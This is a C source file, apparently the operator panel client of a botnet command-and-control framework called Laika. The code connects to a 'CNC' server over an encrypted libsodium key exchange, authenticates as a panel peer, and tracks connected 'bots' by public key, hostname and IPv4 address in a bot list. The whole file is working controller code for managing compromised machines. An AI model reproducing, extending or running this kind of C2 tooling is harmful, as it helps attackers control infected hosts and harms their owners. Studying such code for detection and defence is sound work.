#include "lmem.h"
#include "lerror.h"
#include "pclient.h"
#include "panel.h"

void handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    tPanel_client *client = (tPanel_client*)uData;
    uint8_t endianness = laikaS_readByte(&peer->sock);

    peer->sock.flipEndian = endianness != laikaS_isBigEndian();
}

void handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    char hostname[LAIKA_HOSTNAME_LEN], ipv4[LAIKA_IPV4_LEN];
    uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
    uint8_t type;

    /* read newly connected peer's pubKey */
    laikaS_read(&peer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);

    /* read hostname & ipv4 */
    laikaS_read(&peer->sock, hostname, LAIKA_HOSTNAME_LEN);
    laikaS_read(&peer->sock, ipv4, LAIKA_IPV4_LEN);

    /* read peer's peerType */
    type = laikaS_readByte(&peer->sock);

    /* add peer */
    switch (type) {
        case PEER_BOT: {
            tPanel_bot *bot = panelB_newBot(pubKey, hostname, ipv4);
            panelC_addBot(bot);
            break;
        }
        default:
            LAIKA_WARN("unknown peer type? [%d]\n", type);
    }
}

void handleRmvPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
    uint8_t type;

    /* read newly connected peer's pubKey */
    laikaS_read(&peer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);

    /* read peer's peerType */
    type = laikaS_readByte(&peer->sock);

    /* find peer by pubkey & rmv it */
    switch (type) {
        case PEER_BOT: {
            tPanel_bot *bot = panelB_getBot(pubKey);
            if (bot != NULL)
                panelC_rmvBot(bot);
            break;
        }
        default:
            LAIKA_WARN("unknown peer type? [%d]\n", type);
    }
}

LAIKAPKT_SIZE panelC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t),
    [LAIKAPKT_AUTHENTICATED_ADD_PEER_RES] = crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t) + LAIKA_HOSTNAME_LEN + LAIKA_IPV4_LEN, /* pubkey + peerType + host + ip */
    [LAIKAPKT_AUTHENTICATED_RMV_PEER_RES] = crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t), /* pubkey + peerType */
};

PeerPktHandler panelC_handlerTbl[LAIKAPKT_MAXNONE] = {
    [LAIKAPKT_HANDSHAKE_RES] = handleHandshakeResponse,
    [LAIKAPKT_AUTHENTICATED_ADD_PEER_RES] = handleAddPeer,
    [LAIKAPKT_AUTHENTICATED_RMV_PEER_RES] = handleRmvPeer,
};

tPanel_client *panelC_newClient() {
    tPanel_client *client = laikaM_malloc(sizeof(tPanel_client));
    size_t _unused;

    laikaP_initPList(&client->pList);
    client->peer = laikaS_newPeer(
        panelC_handlerTbl,
        panelC_pktSizeTbl,
        &client->pList,
        (void*)client
    );

    /* load authenticated keypair */
    if (sodium_init() < 0) {
        panelC_freeClient(client);
        LAIKA_ERROR("LibSodium failed to initialize!\n");
    }

    if (sodium_hex2bin(client->pub, crypto_kx_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
        panelC_freeClient(client);
        LAIKA_ERROR("Failed to init public key!\n");
    }

    if (sodium_hex2bin(client->priv, crypto_kx_SECRETKEYBYTES, LAIKA_PRIVKEY, strlen(LAIKA_PRIVKEY), NULL, &_unused, NULL) != 0) {
        panelC_freeClient(client);
        LAIKA_ERROR("Failed to init private key!\n");
    }

    /* read cnc's public key into peerPub */
    if (sodium_hex2bin(client->peer->peerPub, crypto_kx_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
        panelC_freeClient(client);
        LAIKA_ERROR("Failed to init cnc public key!\n");
    }

    return client;
}

void panelC_freeClient(tPanel_client *client) {
    laikaS_freePeer(client->peer);
    laikaP_cleanPList(&client->pList);
    laikaM_free(client);
}

void panelC_connectToCNC(tPanel_client *client, char *ip, char *port) {
    struct sLaika_socket *sock = &client->peer->sock;

    /* setup socket */
    laikaS_connect(sock, ip, port);
    laikaS_setNonBlock(sock);

    laikaP_addSock(&client->pList, sock);

    /* queue handshake request */
    laikaS_startOutPacket(client->peer, LAIKAPKT_HANDSHAKE_REQ);
    laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
    laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
    laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
    laikaS_write(sock, client->pub, sizeof(client->pub)); /* write public key */

    /* write stub hostname & ipv4 (since we're a panel/dummy client, cnc doesn't need this information really) */
    laikaS_zeroWrite(sock, LAIKA_HOSTNAME_LEN);
    laikaS_zeroWrite(sock, LAIKA_IPV4_LEN);
    laikaS_endOutPacket(client->peer);
    laikaS_setSecure(client->peer, true);

    if (crypto_kx_client_session_keys(client->peer->inKey, client->peer->outKey, client->pub, client->priv, client->peer->peerPub) != 0)
        LAIKA_ERROR("failed to gen session key!\n");

    /* queue authenticated handshake request */
    laikaS_startOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ);
    laikaS_writeByte(sock, PEER_AUTH);
    laikaS_endOutPacket(client->peer);

    if (!laikaS_handlePeerOut(client->peer))
        LAIKA_ERROR("failed to send handshake request!\n");
}

bool panelC_poll(tPanel_client *client, int timeout) {
    struct sLaika_pollEvent *evnt;
    int numEvents;

    evnt = laikaP_poll(&client->pList, timeout, &numEvents);

    if (numEvents == 0) /* no events? timeout was reached */
        return false;

LAIKA_TRY
    if (evnt->pollIn && !laikaS_handlePeerIn(client->peer))
        goto _CLIENTKILL;

    if (evnt->pollOut && !laikaS_handlePeerOut(client->peer))
        goto _CLIENTKILL;

    if (!evnt->pollIn && !evnt->pollOut)
        goto _CLIENTKILL;
LAIKA_CATCH
_CLIENTKILL:
    laikaS_kill(&client->peer->sock);
LAIKA_TRYEND

    /* flush pList's outQueue */
    if (client->pList.outCount > 0) {
        if (!laikaS_handlePeerOut(client->peer))
            laikaS_kill(&client->peer->sock);

        laikaP_resetOutQueue(&client->pList);
    }

    return true;
}

void panelC_addBot(tPanel_bot *bot) {
    tPanel_listItem *bItem;
    
    /* add to botList tab */
    bItem = panelL_newListItem(panel_botList, NULL, bot->name, NULL, (void*)bot);

    /* link bot with listItem */
    panelB_setItem(bot, bItem);
}

void panelC_rmvBot(tPanel_bot *bot) {
    tPanel_listItem *bItem = bot->item;

    /* free from bot list & then free the bot */
    panelL_freeListItem(panel_botList, bItem);
    panelB_freeBot(bot);
}